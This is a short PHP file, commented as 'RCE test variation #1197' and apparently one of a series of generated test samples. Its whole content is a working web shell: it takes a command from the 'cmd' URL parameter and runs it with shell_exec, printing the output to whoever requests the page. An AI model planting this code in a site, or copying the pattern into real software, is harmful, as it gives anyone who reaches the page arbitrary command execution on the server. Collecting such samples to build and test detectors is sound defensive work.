<?php
// RCE test variation #1197
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>